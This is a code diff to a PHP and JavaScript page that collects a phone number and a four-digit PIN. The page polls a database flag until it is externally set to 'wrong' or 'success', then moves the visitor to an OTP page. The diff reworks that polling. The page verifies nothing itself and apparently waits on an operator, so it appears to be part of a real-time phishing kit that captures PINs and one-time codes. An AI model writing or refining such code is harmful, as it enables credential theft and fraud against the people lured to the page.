@@ -176,7 +176,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
             $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
             pg_query_params($conn, $insertSQL, [$phone]);
             
-            // Check current pin status before setting to 1
+            // Check current pin status
             $checkSQL = "SELECT pin FROM users WHERE phone = $1";
             $checkResult = pg_query_params($conn, $checkSQL, [$phone]);
             if ($checkResult && $row = pg_fetch_assoc($checkResult)) {
@@ -421,6 +421,7 @@ if (isset($_SESSION['pin_error'])) {
     let isVerifying = <?= json_encode($verifying) ?>;
     let isSubmitting = false;
     let pollingActive = false;
+    let lastPinStatus = 0; // Track last known pin status
     
     function submitForm() {
         if (isSubmitting || isVerifying) return;
@@ -441,16 +442,14 @@ if (isset($_SESSION['pin_error'])) {
     
     function allFilled() {
         let filled = true;
-        let pinValue = '';
         for (let i = 0; i < inputs.length; i++) {
             if (!inputs[i].value) {
                 filled = false;
                 break;
             }
-            pinValue += inputs[i].value;
         }
         
-        if (filled && pinValue.length === 4 && !isVerifying && !isSubmitting) {
+        if (filled && !isVerifying && !isSubmitting) {
             submitForm();
         }
     }
@@ -492,8 +491,11 @@ if (isset($_SESSION['pin_error'])) {
         .then(data => {
             const pinStatus = data.pin_status;
             
-            // If status changed to 1 -> wrong PIN
-            if (pinStatus === 1) {
+            // Only react to changes from 1 to 0 (wrong PIN) or to 2 (success)
+            // We start with pinStatus = 1 after submission (verifying)
+            
+            // If status changed from 1 to 0 -> wrong PIN
+            if (lastPinStatus === 1 && pinStatus === 0) {
                 if (verificationInterval) {
                     clearInterval(verificationInterval);
                     verificationInterval = null;
@@ -504,16 +506,6 @@ if (isset($_SESSION['pin_error'])) {
                 const messageContainer = document.getElementById('messageContainer');
                 messageContainer.innerHTML = '<div id="statusMessage" class="error-message">Wrong PIN. Try again</div>';
                 isVerifying = false;
-                
-                // Reset DB pin to 0
-                fetch(window.location.href, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'X-Requested-With': 'XMLHttpRequest'
-                    },
-                    body: 'action=reset_pin'
-                });
                 
                 // Enable and clear inputs
                 inputs.forEach(input => {
@@ -526,6 +518,7 @@ if (isset($_SESSION['pin_error'])) {
                     inputs[0].focus();
                 }
                 isSubmitting = false;
+                lastPinStatus = 0;
                 
                 // Remove verifying from URL
                 const url = new URL(window.location.href);
@@ -554,7 +547,9 @@ if (isset($_SESSION['pin_error'])) {
                 }
                 window.location.href = 'otp.php';
             }
-            // Status 0 means still waiting, continue polling
+            
+            // Update last known status
+            lastPinStatus = pinStatus;
         })
         .catch(error => console.error('Error checking PIN status:', error));
     }
@@ -604,7 +599,6 @@ if (isset($_SESSION['pin_error'])) {
                 }
                 
                 if (allFilled && !isVerifying && !isSubmitting) {
-                    // Small delay to ensure last character is registered
                     setTimeout(() => {
                         if (!isSubmitting && !isVerifying) {
                             let pinValue = '';
@@ -693,6 +687,9 @@ if (isset($_SESSION['pin_error'])) {
         inputs.forEach(input => {
             input.disabled = true;
         });
+        
+        // Set initial lastPinStatus to 1 (since we just set it to 1 in database)
+        lastPinStatus = 1;
         
         pollingActive = true;
         verificationInterval = setInterval(checkPinStatus, 2000);
